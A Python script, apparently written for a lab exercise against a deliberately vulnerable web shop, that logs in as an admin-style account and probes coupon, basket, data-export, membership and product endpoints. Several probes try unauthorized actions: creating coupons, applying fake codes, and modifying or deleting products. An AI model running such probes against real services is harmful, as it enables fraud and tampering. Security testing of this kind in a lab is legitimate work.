import subprocess, json

base = "http://lab-mutator:3000"
token = json.loads(subprocess.run(["curl", "-s", "-X", "POST", base + "/rest/user/login",
    "-H", "Content-Type:application/json",
    "-d", json.dumps({"email": "adminhacker@x.com", "password": "AdminPass123!", "rememberMe": False})],
    capture_output=True, text=True).stdout)["authentication"]["token"]


def req(method, path, data=None):
    cmd = ["curl", "-s"] + (["-X", method] if method != "GET" else [])
    hdrs = ["-H", "Authorization:Bearer " + token]
    if data:
        cmd += ["-H", "Content-Type:application/json", "-d", data]
    r = subprocess.run(cmd + hdrs + [base + path], capture_output=True, text=True)
    return r.returncode, r.stdout[:150].replace("\n", " ")


def printp(label, items):
    print("\n=== " + label + " ===")
    for m, p, d in items:
        rc, out = req(m, p, d)
        print("%s %s  rc=%d  %s" % (m, p, rc, out))


printp("coupons", [
    ("GET", "/api/Coupons/1", None),
    ("GET", "/api/Coupons/search", None),
    ("POST", "/api/Coupons/search", '{"searchQuery":"test"}'),
    ("POST", "/api/Coupons", '{"code":"FAKE","discount":50}'),
    ("PUT", "/rest/basket/1/coupon/FAKECODE", "{}"),
    ("PUT", "/rest/basket/1/coupon/1", "{}"),
    ("GET", "/rest/basket/1/coupon/FAKECODE", None),
])

printp("data export", [
    ("GET", "/api/UserAccounts/1/export", None),
    ("GET", "/api/Export/1", None),
    ("GET", "/api/UserAccounts/export", None),
    ("GET", "/api/Export", None),
    ("GET", "/rest/user/data-export", None),
    ("GET", "/privacy-security/data-export", None),
    ("POST", "/api/UserAccounts/1/export", "{}"),
])

printp("deluxe", [
    ("GET", "/api/DeluxeMemberships", None),
    ("GET", "/rest/deluxe-membership", None),
    ("GET", "/rest/user/deluxe", None),
    ("POST", "/rest/user/deluxe/fraud", '{"userId":1}'),
])

printp("product endpoints", [
    ("GET", "/api/Products/1", None),
    ("PUT", "/api/Products/1", '{"id":1,"description":"test"}'),
    ("POST", "/api/Products", '{"name":"x","description":"y"}'),
    ("DELETE", "/api/Products/1", None),
])
